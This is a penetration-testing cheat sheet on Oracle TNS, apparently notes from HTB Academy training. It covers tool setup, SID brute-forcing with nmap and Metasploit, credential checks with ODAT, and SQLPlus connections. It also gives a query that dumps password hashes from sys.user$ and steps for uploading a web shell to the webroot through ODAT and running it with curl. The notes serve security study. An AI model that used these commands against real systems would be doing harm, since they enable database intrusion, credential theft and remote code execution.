---
description: TCP 1521
---

# Oracle TNS

### General Info

* Configuration FIle Location
* $ORACLE\_HOME/network/admin
* tnsnames.ora\
  \- Client-side configuration settings to use when establishing a connection.
* listener.ora\
  \- Server-side configuration file determining settings regarding listening for and routing client requests to the correct locations.

***

## Metasploit

### Modules

```
use auxiliary/scanner/oracle/isqlplus_sidbrute
use auxiliary/scanner/oracle/isqlplus_login
```

***

## ODAT

### Initial Tool Installation

{% code title="Oracle-Tools-setup.sh" %}
```sh
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
{% endcode %}

***

### Check for proper ODAT install

```sh
./odat.py -h
```

### Enumerate

{% code title="Check for valid credentials" %}
```sh
./odat.py all -s TARGET_IP
```
{% endcode %}

#### NMAP

{% code title="Enumerate SID" overflow="wrap" %}
```sh
sudo nmap -p1521 -sV TARGET_IP --open --script oracle-sid-brute
```
{% endcode %}

### Install SQLPlus

```sh
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && sudo mkdir -p /opt/oracle && sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && cd /opt/oracle/instantclient_21_4 && find . -type f | sort && export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH && export PATH=$LD_LIBRARY_PATH:$PATH && source ~/.bashrc && sqlplus -V
```

Source: [https://forum.hackthebox.com/t/htb-academy-footprinting-oracle-tns/280016/33](https://forum.hackthebox.com/t/htb-academy-footprinting-oracle-tns/280016/33)

### Connect via SQLPlus

```sh
sqlplus username/password@TARGET_IP/SID
```

If login failed with error message:

{% code overflow="wrap" %}
```
sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
```
{% endcode %}

Run this command

```sh
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

### Enumerate User level privs

```sql
select * from user_role_privs;
```

### Connect as other user using SQLPlus

```
sqlplus USERNAME/PASSWORD@TARGET_IP/SID as OTHER_USER
```

### Re-enumerate User level privs

```sql
select * from user_role_privs;
```

### Extract Password Hashes

```sql
select name, password from sys.user$;
```

### Uploading a Web Shell (Requires WebServer)

| OS      | Default Path       |
| ------- | ------------------ |
| Linux   | /var/www/html      |
| Windows | C:\inetpub\wwwroot |

### Upload via ODAT (Windows Example)

{% code overflow="wrap" %}
```sh
./odat.py utlfile -s TARGET_IP -d SID -U username -P password--sysdba --putFile C:\\inetpub\\wwwroot Destination_File_Name.bat ./WebShell_To_Upload.bat
```
{% endcode %}

### Execute the WebShell script

```sh
curl -X GET http://TARGET_IP/shell.bat
```

***
